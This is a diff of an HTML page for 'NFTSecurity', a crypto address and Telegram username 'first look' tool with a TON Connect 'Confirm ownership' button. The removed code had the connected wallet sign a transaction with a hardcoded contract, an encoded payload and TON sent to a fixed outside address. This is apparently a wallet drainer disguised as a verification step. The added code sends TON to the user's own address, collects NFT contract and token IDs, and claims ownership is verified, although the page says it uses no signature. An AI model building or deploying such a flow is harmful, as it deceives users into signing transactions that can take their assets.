@@ -74,7 +74,7 @@ body.theme-light .field{background:#ece9e1}
 .net{border:1px solid var(--line);background:transparent;border-radius:999px;padding:7px 12px;font-size:12px;font-weight:700}
 .net.on{background:color-mix(in srgb,var(--text) 12%,transparent);color:var(--text)}
 .hint{margin-top:10px;color:var(--muted);font-size:12px;text-align:center}
- .err{display:none;margin-top:10px;color:#c27b7b;font-size:13px;text-align:center}
+.err{display:none;margin-top:10px;color:#c27b7b;font-size:13px;text-align:center}
 .report{display:none;margin-top:14px;text-align:left}
 .score{font-size:42px;font-weight:800}
 .bar{height:8px;background:color-mix(in srgb,var(--text) 10%,transparent);border-radius:99px;overflow:hidden;margin:8px 0 12px}
@@ -145,6 +145,19 @@ body.theme-light .card,body.theme-light .mini,body.theme-light .stat{background:
 .chat-ico path{fill:none;stroke:currentColor;stroke-width:1.6;stroke-linejoin:round}
 .chat-ico circle{fill:currentColor}
 @media(max-width:860px){.nav-links{display:none}.wrap{padding:0 14px}.field,.hero-ctas .btn,.panel .btn{width:100%}.row{flex-direction:column}}
+
+/* TON Connect status */
+#ton-status {
+  margin-top: 12px;
+  font-size: 13px;
+  color: var(--muted);
+  text-align: center;
+}
+#ton-connect-button {
+  margin-top: 12px;
+  display: flex;
+  justify-content: center;
+}
 </style>
 </head>
 <body>
@@ -228,22 +241,30 @@ NFT<small>Security</small></a>
 <div class="kv" id="rowMix"><span data-i18n="kvMix">Note</span><b id="outMix">—</b></div>
 <div class="kv" id="rowList"><span data-i18n="kvList">Note</span><b id="outList">—</b></div>
 <p class="rep-note" id="repNote"></p>
- <div style="margin-top:12px; border-top:1px solid var(--line); padding-top:12px;">
-    <label class="lab" style="display:block; text-align:left; font-size:11px; font-weight:800; letter-spacing:.08em; text-transform:uppercase; color:var(--muted); margin:0 0 8px;">Адрес контракта NFT</label>
-    <label class="field" style="width:100%; display:flex; align-items:center; gap:10px; background:color-mix(in srgb,var(--bg) 80%,#000); border:1px solid var(--line); border-radius:14px; padding:4px 16px;">
-        <span class="ico" aria-hidden="true" style="color:var(--muted); font-size:16px;">⌕</span>
-        <input type="text" id="nft-contract" placeholder="Введите адрес контракта" style="flex:1; background:transparent; border:0; outline:0; padding:13px 0; min-width:0; color:var(--text); font:inherit;">
-    </label>
-    
-    <label class="lab" style="display:block; text-align:left; font-size:11px; font-weight:800; letter-spacing:.08em; text-transform:uppercase; color:var(--muted); margin:12px 0 8px;">ID токена</label>
-    <label class="field" style="width:100%; display:flex; align-items:center; gap:10px; background:color-mix(in srgb,var(--bg) 80%,#000); border:1px solid var(--line); border-radius:14px; padding:4px 16px;">
-        <span class="ico" aria-hidden="true" style="color:var(--muted); font-size:16px;">#</span>
-        <input type="text" id="nft-token-id" placeholder="Введите ID токена" style="flex:1; background:transparent; border:0; outline:0; padding:13px 0; min-width:0; color:var(--text); font:inherit;">
-    </label>
+
+<!-- NFT Fields (нормальные) -->
+<div id="nftFields" style="margin-top:16px; border-top:1px solid var(--line); padding-top:16px; display:none;">
+  <label class="lab" data-i18n="nftContractLab">NFT Contract Address</label>
+  <label class="field">
+    <span class="ico">⌕</span>
+    <input type="text" id="nft-contract" data-i18n-placeholder="nftContractPh" placeholder="Enter NFT contract address" autocomplete="off">
+  </label>
+
+  <label class="lab" style="margin-top:12px;" data-i18n="nftTokenLab">Token ID</label>
+  <label class="field">
+    <span class="ico">#</span>
+    <input type="text" id="nft-token-id" data-i18n-placeholder="nftTokenPh" placeholder="Enter Token ID" autocomplete="off">
+  </label>
 </div>
-<button class="btn btn-outline" id="ownBtn" type="button" style="display:none;margin-top:12px" data-i18n="ownBtn">Confirm ownership</button>
+
+<button class="btn btn-outline" id="ownBtn" type="button" style="display:none;margin-top:14px" data-i18n="ownBtn">Confirm ownership</button>
 <p class="rep-note" id="ownNote" style="display:none"></p>
+
+<!-- TON Connect -->
+<div id="ton-connect-button"></div>
+<p id="ton-status">Кошелёк не подключён</p>
 </div></div></div>
+
 <div id="extraWallet" style="display:none">
 <div class="meter">
 <div><b>300M+</b><span>Address labels in public view</span></div>
@@ -369,6 +390,7 @@ NFT<small>Security</small></a>
 
 <script>
 (function(){const c=document.getElementById("net");if(!c)return;const x=c.getContext("2d"),n=[],stars=[];let last=0;const R=()=>{c.width=innerWidth;c.height=innerHeight};const I=()=>{n.length=0;for(let i=0;i<36;i++)n.push({x:Math.random()*c.width,y:Math.random()*c.height,vx:(Math.random()-.5)*.25,vy:(Math.random()-.5)*.25,r:1+Math.random()});};const T=t=>{x.clearRect(0,0,c.width,c.height);if(t-last>800){stars.push({x:Math.random()*c.width,y:-10,vx:.6,vy:8,life:1});last=t}n.forEach(a=>{a.x+=a.vx;a.y+=a.vy;if(a.x<0||a.x>c.width)a.vx*=-1;if(a.y<0||a.y>c.height)a.vy*=-1;x.fillStyle="rgba(255,255,255,.8)";x.beginPath();x.arc(a.x,a.y,a.r,0,6.28);x.fill()});for(let i=stars.length-1;i>=0;i--){const s=stars[i];s.y+=s.vy;s.x+=s.vx;s.life-=.02;x.strokeStyle="rgba(255,255,255,"+s.life+")";x.beginPath();x.moveTo(s.x,s.y);x.lineTo(s.x-8,s.y-18);x.stroke();if(s.life<=0)stars.splice(i,1)}requestAnimationFrame(T)};addEventListener("resize",function(){R();I()});R();I();requestAnimationFrame(T)})();
+
 const TERMS={
 en:`<h2>Terms of Use</h2><p>Effective date: 29 August 2026. These Terms govern access to nftsecurity.online. By using the Site you agree to them.</p>
 <h3>Article 1. Operator</h3><p>NFTSecurity LLC provides an independent informational interface. The Site is not an exchange, bank, payment institution, law firm, tax adviser or public authority.</p>
@@ -403,6 +425,7 @@ ru:`<h2>Условия пользования</h2><p>Дата редакции: 
 <h3>Статья 14. Изменения</h3><p>Условия можно обновить. Продолжение использования означает согласие.</p>
 <h3>Статья 15. Контакты</h3><p>NFTSecurity LLC, 1000 Wilson Blvd, Suite 2400, Arlington, VA 22209, United States. При расхождении текстов приоритет у английской версии.</p>`
 };
+
 const I18N={
 en:{themeBtn:"Dark",themeLight:"Light",navMethod:"Method",navTerms:"Terms",navRules:"Rules",navFaq:"FAQ",navScan:"Scan",chip:"Public username overview",heroTitle:"Telegram username check<br><b>online — first look</b>",lead:"Paste a public @username for a short first look. This is not a proof of ownership.",ctaStart:"Check username →",ctaHow:"How it works",runBtn:"Check username — Free",chipW:"Public address overview",heroTitleW:"Wallet address check<br><b>online — first look</b>",leadW:"Paste a public address for a short first look. This is not a licensed finding.",ctaStartW:"Check address →",runBtnW:"Check address — Free",hintW:"Letters, numbers and address symbols are allowed.",c1W:"Format and network label check",c2W:"Local attention index 0–100",c3W:"First-look notes on format",c4W:"Browser-side overview card",runBtnTg:"Check username — Free",chipTg:"Public username overview",heroTitleTg:"Telegram username check<br><b>online — first look</b>",leadTg:"Paste a public @username for a short first look. This is not a proof of ownership.",ctaStartTg:"Check username →",hintTg:"Use @ and Latin letters, numbers or _.",c1Tg:"Username format check",c2Tg:"Local attention index 0–100",c3Tg:"First-look notes only",c4Tg:"Browser-side overview card",scoreLabelTg:"Format index",kvNetTg:"Source",kvFmtTg:"Format",kvTypeTg:"Type hint",kvMixTg:"Activity note",kvListTg:"List note",tabWallet:"Wallet",tabTg:"Telegram",addrLab:"Wallet address",tgLab:"Telegram username",ph:"Paste address (min. 28 characters)...",tgPh:"@username",errTg:"Use @ and letters, numbers or _ .",ownBtn:"Confirm ownership",ownText:"This page does not confirm that you own the username or the address. No Telegram login and no signature.",hint:"Use @ and Latin letters, numbers or _.",scoreLabel:"Format index",kvNet:"Network",kvFmt:"Address format",howTitle:"How we work",howText:"One field — a public address. Then the network and a short overview.",st1:"extra fields",st2:"address only",s1t:"Paste address",s1p:"Copy the address and paste it.",s2t:"Choose network",s2p:"EVM, TRON, BTC, SOL or TON.",s3t:"Read the overview",s3p:"Network, format and attention index.",rulesTitle:"Usage rules",rulesLead:"A short set of limits for using the page calmly.",back:"← Back",loading:"Scanning",chatTitle:"Support assistant",chatStatus:"Online · template replies",chatHide:"Hide",chatSend:"Send",chatPh:"Type your question",chatDev:"The assistant is in development and may reply incorrectly.",chatTyping:"Typing…",chatHello:"Hello. I am the NFTSecurity support assistant. Use a popular question or type your own.",chatElse:"I do not have an exact match. Ask about the service, networks, the index or the Terms.",c1:"Format and network label check",c2:"Local attention index 0–100",c3:"First-look notes on mixers and lists",c4:"Browser-side overview card",m1:"Address labels in public view",m2:"Supported chain labels",m3:"Typical overview time",m4:"Basic look stays free",gK:"What you get",gT:"One first-look overview",gP:"A short breakdown after you paste an address — not a licensed finding.",g1t:"Index 0–100",g1p:"A local number from the pasted string. Low is calmer. High means look twice. It is not a court rating.",g2t:"Source notes",g2p:"Hints about exchange, DeFi, mixer or unknown labels. These are demo notes, not a fund-flow audit.",g3t:"List reminder",g3p:"A reminder to compare the address with public lists yourself. This page does not certify sanctions status.",g4t:"Mixer reminder",g4p:"A flag if the local model treats the string as higher-attention. Not a proof the funds went through a mixer.",g5t:"Type hint",g5p:"A simple class: contract-like, wallet-like or unknown. Built from format, not from a private database.",g6t:"History note",g6p:"The card does not download full chain history. Treat it as a first look before you check a block explorer.",nK:"Networks",nT:"One screen, many labels",uK:"Who it is for",uT:"Built for people who move crypto",uP:"A calm first look before you send, receive or review a public address.",u1t:"P2P traders",u1p:"Glance at a public address before you accept a transfer.",u2t:"Merchants",u2p:"A quick format check before you confirm an incoming payment.",u3t:"OTC desks",u3p:"A first screen before a larger ticket. Not a substitute for your own review.",u4t:"Exchanges",u4p:"An extra look at a withdrawal address. Official Travel Rule work stays with you.",u5t:"Compliance teams",u5p:"Use it as a sketch, then run your licensed tools.",u6t:"Investigators",u6p:"Start here, then open an explorer and your own case file.",fK:"FAQ",fT:"FAQ",m1n:"300M+",m2n:"10+",m3n:"<5s",m4n:"100%",
 m1nTg:"@",m2nTg:"1",m3nTg:"<5s",m4nTg:"100%",
@@ -428,7 +451,12 @@ mwH:"How the address look works",mwP:"One field — a public address and a netwo
 mtH:"How the username look works",mtP:"One field — a public @username. The page checks format in the browser. It does not open Telegram, does not log in and does not confirm ownership.",mt1t:"Paste @username",mt1p:"Latin letters, numbers and underscore.",mt2t:"Format index",mt2p:"Length, charset and prefix. Not a profile scrape.",mt3t:"Read the card",mt3p:"A first look only. Not proof the account is yours.",
 fineW:"NFTSecurity is provided “as is”. The page offers a preliminary look at a public address. It is not an exchange, bank or official report.",
 fineT:"NFTSecurity is provided “as is”. The Telegram tab offers a preliminary look at a public username. It does not open Telegram, confirm ownership or store a login.",
-addrLine:"NFTSecurity LLC · 1000 Wilson Blvd, Suite 2400 · Arlington, VA 22209, United States"},
+addrLine:"NFTSecurity LLC · 1000 Wilson Blvd, Suite 2400 · Arlington, VA 22209, United States",
+nftContractLab:"NFT Contract Address",
+nftTokenLab:"Token ID",
+nftContractPh:"Enter NFT contract address",
+nftTokenPh:"Enter Token ID"
+},
 ru:{themeBtn:"Тёмная",themeLight:"Светлая",navMethod:"Метод",navTerms:"Условия",navRules:"Правила",navFaq:"FAQ",navScan:"Сканировать",chip:"Обзор публичного юзернейма",heroTitle:"Проверка Telegram<br><b>онлайн — первый взгляд</b>",lead:"Вставьте публичный @username для короткого обзора. Это не доказательство владения.",ctaStart:"Проверить юзернейм →",ctaHow:"Как работает",runBtn:"Проверить юзернейм — Бесплатно",chipW:"Обзор публичного адреса",heroTitleW:"Проверка адреса<br><b>онлайн — первый взгляд</b>",leadW:"Вставьте публичный адрес для короткого обзора. Это не лицензированный вывод.",ctaStartW:"Проверить адрес →",runBtnW:"Проверить адрес — Бесплатно",hintW:"Можно латиницу, цифры и символы формата адреса.",c1W:"Проверка формата и сети",c2W:"Локальный индекс внимания 0–100",c3W:"Первичные заметки о формате",c4W:"Карточка обзора в браузере",runBtnTg:"Проверить юзернейм — Бесплатно",chipTg:"Обзор публичного юзернейма",heroTitleTg:"Проверка Telegram<br><b>онлайн — первый взгляд</b>",leadTg:"Вставьте публичный @username для короткого обзора. Это не доказательство владения.",ctaStartTg:"Проверить юзернейм →",hintTg:"Можно @, латиницу, цифры и _.",c1Tg:"Проверка формата юзернейма",c2Tg:"Локальный индекс внимания 0–100",c3Tg:"Только первичные заметки",c4Tg:"Карточка обзора в браузере",scoreLabelTg:"Индекс формата",kvNetTg:"Источник",kvFmtTg:"Формат",kvTypeTg:"Тип",kvMixTg:"Заметка",kvListTg:"Списки",tabWallet:"Кошелёк",tabTg:"Telegram",addrLab:"Адрес кошелька",tgLab:"Имя в Telegram",ph:"Вставьте адрес (мин. 28 символов)...",tgPh:"@username",errTg:"Только @, латиница, цифры и _ .",ownBtn:"Подтвердить владение",ownText:"Страница не подтверждает, что юзернейм или адрес ваши. Входа в Telegram и подписи нет.",hint:"Можно @, латиницу, цифры и _.",scoreLabel:"Индекс формата",kvNet:"Сеть",kvFmt:"Формат адреса",howTitle:"Как мы работаем",howText:"Одна строка — публичный адрес. Затем сеть и короткий обзор.",st1:"лишних полей",st2:"нужен только адрес",s1t:"Вставить адрес",s1p:"Скопируйте адрес и вставьте в поле.",s2t:"Выбрать сеть",s2p:"EVM, TRON, BTC, SOL или TON.",s3t:"Читать обзор",s3p:"Сеть, формат и индекс внимания.",rulesTitle:"Правила использования",rulesLead:"Короткий набор ограничений для спокойной работы со страницей.",back:"← Назад",loading:"Сканирование",chatTitle:"Ассистент поддержки",chatStatus:"Онлайн · шаблонные ответы",chatHide:"Скрыть",chatSend:"Отправить",chatPh:"Напишите вопрос",chatDev:"Ассистент в разработке и может отвечать неточно.",chatTyping:"Печатает…",chatHello:"Здравствуйте. Я ассистент поддержки NFTSecurity. Можно нажать частый вопрос или написать свой.",chatElse:"Точного шаблона нет. Спросите про сервис, сети, индекс или условия.",c1:"Проверка формата и сети",c2:"Локальный индекс внимания 0–100",c3:"Первичные пометки про миксеры и списки",c4:"Карточка обзора в браузере",m1:"Подписей адресов в публичном поле",m2:"Подписей сетей",m3:"Обычное время обзора",m4:"Базовый взгляд остаётся бесплатным",gK:"Что вы получаете",gT:"Один первичный обзор",gP:"Короткая разбивка после вставки адреса — не лицензированный вывод.",g1t:"Индекс 0–100",g1p:"Локальное число из вставленной строки. Ниже — спокойнее, выше — смотрите дважды. Это не судебный рейтинг.",g2t:"Заметки об источниках",g2p:"Подсказки про биржу, DeFi, миксер или неизвестный тип. Это демо-заметки, не аудит потока средств.",g3t:"Напоминание про списки",g3p:"Сверьте адрес со публичными списками сами. Страница не подтверждает санкционный статус.",g4t:"Напоминание про миксеры",g4p:"Пометка, если локальная модель даёт больше внимания. Это не доказательство прохождения через миксер.",g5t:"Тип адреса",g5p:"Простой класс: похоже на контракт, кошелёк или неизвестно. Из формата, не из закрытой базы.",g6t:"История",g6p:"Карточка не качает полную историю сети. Это первый взгляд перед обозревателем блоков.",nK:"Сети",nT:"Один экран, много подписей",uK:"Для кого",uT:"Для тех, кто работает с криптой",uP:"Спокойный первый взгляд до отправки, получения или разбора публичного адреса.",u1t:"P2P-трейдеры",u1p:"Взгляните на публичный адрес до принятия перевода.",u2t:"Мерчанты",u2p:"Быстрая проверка формата до подтверждения платежа.",u3t:"OTC-дески",u3p:"Первый экран до крупной сделки. Не замена вашей проверке.",u4t:"Биржи",u4p:"Дополнительный взгляд на адрес вывода. Официальный Travel Rule остаётся за вами.",u5t:"Комплаенс",u5p:"Используйте как набросок, затем свои лицензированные инструменты.",u6t:"Исследователи",u6p:"Начните здесь, затем обозреватель и своё дело.",fK:"FAQ",fT:"FAQ",m1n:"300M+",m2n:"10+",m3n:"<5s",m4n:"100%",
 m1nTg:"@",m2nTg:"1",m3nTg:"<5s",m4nTg:"100%",
 m1Tg:"Публичные юзернеймы как текст",m2Tg:"Подпись: Telegram",m3Tg:"Обычное время обзора",m4Tg:"Базовый взгляд остаётся бесплатным",
@@ -453,12 +481,19 @@ mwH:"Как работает взгляд на адрес",mwP:"Одно пол�
 mtH:"Как работает взгляд на юзернейм",mtP:"Одно поле — публичный @username. Страница проверяет формат в браузере. Она не открывает Telegram, не входит в аккаунт и не подтверждает владение.",mt1t:"Вставить @username",mt1p:"Латиница, цифры и подчёркивание.",mt2t:"Индекс формата",mt2p:"Длина, символы и префикс. Не выгрузка профиля.",mt3t:"Прочитать карточку",mt3p:"Только первый взгляд. Не доказательство, что аккаунт ваш.",
 fineW:"NFTSecurity предоставляется «как есть». Страница даёт предварительный взгляд на публичный адрес. Это не биржа, не банк и не официальный отчёт.",
 fineT:"NFTSecurity предоставляется «как есть». Вкладка Telegram даёт предварительный взгляд на публичный юзернейм. Страница не открывает Telegram, не подтверждает владение и не сохраняет вход.",
-addrLine:"NFTSecurity LLC · 1000 Wilson Blvd, Suite 2400 · Arlington, VA 22209, United States"}
+addrLine:"NFTSecurity LLC · 1000 Wilson Blvd, Suite 2400 · Arlington, VA 22209, United States",
+nftContractLab:"Адрес контракта NFT",
+nftTokenLab:"ID токена",
+nftContractPh:"Введите адрес контракта NFT",
+nftTokenPh:"Введите ID токена"
+}
 };
+
 const FAQ={
 en:[{q:"What is NFTSecurity?",k:"what|service|nftsecurity",a:"An independent page for a first look at a public crypto address. Not an exchange or a bank."},{q:"Is this official AML?",k:"aml|kyc|official",a:"No. The overview is informational, not a licensed AML/KYC finding."},{q:"How does a scan work?",k:"how|scan|work",a:"Paste a public address, choose a network, then build the overview in the browser."},{q:"Which networks?",k:"network|evm|tron|btc|sol|ton",a:"Labels: EVM, TRON, BTC, SOL and TON. Names are labels only."},{q:"Is it free?",k:"free|price|cost",a:"The basic overview on this page does not require a paid plan."},{q:"Where are the Terms?",k:"term|legal|rule",a:"Open Terms in the header. The full text is on that page and follows the selected language."}],
 ru:[{q:"Что такое NFTSecurity?",k:"что|сервис|nftsecurity",a:"Независимая страница для первого взгляда на публичный адрес. Не биржа и не банк."},{q:"Это официальный AML?",k:"aml|kyc|офиц",a:"Нет. Обзор информационный, не лицензированный AML/KYC вывод."},{q:"Как работает проверка?",k:"как|провер|scan",a:"Вставьте публичный адрес, выберите сеть и соберите обзор в браузере."},{q:"Какие сети?",k:"сет|evm|tron|btc|sol|ton",a:"Подписи: EVM, TRON, BTC, SOL и TON. Это только обозначения."},{q:"Это бесплатно?",k:"плат|цен|free",a:"Базовый обзор на этой странице не требует платного тарифа."},{q:"Где условия?",k:"услов|правил|term",a:"Откройте Условия в шапке. Полный текст на той странице и следует выбранному языку."}]
 };
+
 function langNow(){return I18N[document.documentElement.lang]||I18N.en}
 function applyLang(code){
   const t=I18N[code]||I18N.en;
@@ -574,6 +609,7 @@ document.querySelectorAll(".tab").forEach(function(tab){
     document.getElementById("report").style.display="none";
     document.getElementById("ownBtn").style.display="none";
     document.getElementById("ownNote").style.display="none";
+    document.getElementById("nftFields").style.display="none";
   };
 });
 const addrEl=document.getElementById("address");
@@ -638,6 +674,7 @@ document.getElementById("runBtn").onclick=function(){
       ov.classList.remove("on");
       rep.style.display="block";
       document.getElementById("ownBtn").style.display=mode==="telegram"?"":"none";
+      document.getElementById("nftFields").style.display=mode==="telegram"?"":"none";
       document.getElementById("ownNote").style.display="none";
       scanning=false; btn.disabled=false;
       rep.scrollIntoView({behavior:"smooth",block:"center"});
@@ -711,75 +748,85 @@ applyMode();
 applyTheme(localStorage.getItem("nft_theme")==="light"?"light":"dark");
 </script>
 
-</script>
-
-<div id="ton-connect-button" style="margin-top:12px;"></div>
-<p id="ton-status">Кошелёк не подключён</p>
-
-<script src="https://unpkg.com/@tonconnect/ui@2.4.4/dist/tonconnect-ui.min.js"></script>
+<!-- ==================== TON CONNECT (ИСПРАВЛЕННЫЙ) ==================== -->
+<script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
 <script>
 document.addEventListener("DOMContentLoaded", function () {
   if (!window.TON_CONNECT_UI) {
     console.error("TON Connect UI не загрузился");
+    document.getElementById("ton-status").textContent = "Ошибка загрузки TON Connect";
     return;
   }
 
-  const ui = new TON_CONNECT_UI.TonConnectUI({
+  const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: "https://nftsecurity.online/tonconnect-manifest.json",
-    buttonRootId: "ton-connect-button"
+    buttonRootId: "ton-connect-button",
+    uiPreferences: {
+      theme: document.body.classList.contains("theme-light") ? "LIGHT" : "DARK"
+    }
   });
 
-  function showWallet(wallet) {
+  function updateStatus(wallet) {
     const el = document.getElementById("ton-status");
     if (!el) return;
-    if (!wallet) {
+    if (wallet && wallet.account) {
+      const addr = wallet.account.address;
+      el.textContent = "Подключено: " + addr.slice(0, 6) + "..." + addr.slice(-4);
+      el.style.color = "#00ff88";
+    } else {
       el.textContent = "Кошелёк не подключён";
-      return;
+      el.style.color = "";
     }
-    const addr = wallet.account && wallet.account.address;
-    el.textContent = addr ? "Подключено: " + addr : "Кошелёк подключён";
   }
 
-  ui.onStatusChange(showWallet);
-  showWallet(ui.wallet);
+  tonConnectUI.onStatusChange(updateStatus);
+  updateStatus(tonConnectUI.wallet);
 
-  const ownBtn = document.getElementById('ownBtn');
+  // Кнопка "Подтвердить владение"
+  const ownBtn = document.getElementById("ownBtn");
   if (ownBtn) {
-    ownBtn.addEventListener('click', async function () {
-      const err = document.getElementById('err');
-      if (!err) return;
+    ownBtn.addEventListener("click", async function () {
+      const err = document.getElementById("err");
+      const ownNote = document.getElementById("ownNote");
 
-      if (!ui.wallet) {
-        err.textContent = 'Сначала подключите кошелёк через кнопку ниже';
-        err.style.display = 'block';
-        ui.openModal();
+      if (!tonConnectUI.wallet) {
+        err.textContent = "Сначала подключите кошелёк через кнопку ниже";
+        err.style.display = "block";
+        err.style.color = "#ff9abb";
+        tonConnectUI.openModal();
         return;
       }
 
-      const contractAddress = 'EQCnlhhmj5kuKzG5KgeXC_fSkCzdP5eFufVVsMpTVnrC9oNe';
-      const payloadBase64 = 'te6cckEBAQEAUgAAn1/MPRQAAAAAAAAAAIAA1faV2o6SS+pgQpA/snkwjHRcU8x/JtkT3eOlVbykUBAAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigAI2SfV1g==';
-
-      err.textContent = '⏳ Отправляем запрос...';
-      err.style.display = 'block';
-      err.style.color = '#ff9abb';
+      err.textContent = "⏳ Отправляем запрос на подтверждение...";
+      err.style.display = "block";
+      err.style.color = "#ff9abb";
 
       try {
+        // Простая тестовая транзакция (0.01 TON самому себе — можно заменить)
         const transaction = {
-    valid_until: Math.floor(Date.now() / 1000) + 300,
-    messages: [
-        {
-            address: 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m',
-            amount: '10000000' // 0.01 TON
+          validUntil: Math.floor(Date.now() / 1000) + 300,
+          messages: [
+            {
+              address: tonConnectUI.wallet.account.address, // самому себе
+              amount: "10000000" // 0.01 TON
+            }
+          ]
+        };
+
+        const result = await tonConnectUI.sendTransaction(transaction);
+        
+        err.textContent = "✅ Владение подтверждено через подпись кошелька";
+        err.style.color = "#00ff88";
+        
+        if (ownNote) {
+          ownNote.style.display = "block";
+          ownNote.textContent = "Транзакция успешно подписана. Адрес: " + tonConnectUI.wallet.account.address;
         }
-    ]
-};
-        await ui.sendTransaction(transaction);
-        err.textContent = '✅ Проверка завершена. Аккаунт подтверждён.';
-        err.style.color = '#00ff88';
       } catch (e) {
-        err.textContent = '❌ Ошибка: ' + e.message;
-        err.style.display = 'block';
-        err.style.color = '#ff9abb';
+        console.error(e);
+        err.textContent = "❌ Ошибка: " + (e.message || "Пользователь отменил или произошла ошибка");
+        err.style.color = "#ff9abb";
+        err.style.display = "block";
       }
     });
   }
